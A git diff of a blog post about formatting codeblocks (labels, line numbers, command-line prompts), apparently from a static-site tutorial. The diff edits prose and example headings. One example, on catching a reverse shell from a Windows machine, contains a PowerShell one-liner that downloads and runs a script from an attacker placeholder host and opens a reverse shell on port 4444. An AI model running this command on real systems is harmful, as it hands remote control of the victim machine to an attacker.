@@ -16,9 +16,9 @@ In this post, I’ll demonstrate a few simple changes to easily coerce these plu
 
 ## Why enhance codeblocks?
 
-Simple codeblocks suffice for most writers who need supporting text with pretty colours.
+Simple codeblocks suffice for most writers who need supporting text with pretty colours. But maybe you want your codeblocks to simply look *flashier*. Or maybe you want better tools *to tell a story*!
 
-But to tell a good story, the characters, plot, and location need to be clear to the audience. Similarly, some (not all) blog posts and tutorials benefit from enhancements such as command-line demarcations, line numbers, labels, and inline markup.
+To tell a good story, the characters, plot, and location need to be clear to the audience. Similarly, blog posts and tutorials benefit from enhancements such as command-line demarcations, line numbers, labels, and inline markup.
 
 There are many cases where such codeblocks are warranted:
 
@@ -28,7 +28,7 @@ There are many cases where such codeblocks are warranted:
 - A post refers to a code snippet within a large file (line-numbers)
 - A post refers to multiple files (label)
 
-{% details "Example: Catching Reverse Shells" %}
+{% details "Example: Catching Reverse Shells (Labels and Command-Line)" %}
 This is really useful when presenting narratives for red teaming scenarios, where multiple machines are involved. Here are some simple notes on catching a reverse shell from a Windows machine.
 
 1. *Get our IP.*
@@ -49,11 +49,12 @@ This is really useful when presenting narratives for red teaming scenarios, wher
     powershell -nop -c "iex (New-Object Net.WebClient).DownloadString('http://{ATTACKER_IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ATTACKER_IP} -Port 4444" 
     ```
 
+It's clear that our character shifts from Scene 1 to Scene 2, with less sentence clutter.
 {% enddetails %}
 
 Another problem I notice on many documentation pages is the use of `$`, denoting the start of a new command on a shell. These are poor for a couple reasons: it doesn't accurately present the actual code (from both the writer's and readers' PoV) and may disrupt syntax highlighters.
 
-{% details "Example: The Obstructive $" %}
+{% details "Example: The Obstructive $ (Command-Line)" %}
 
 These are commonly seen in installation scripts or guides. Here's an example installing a Makefile-based project:
 
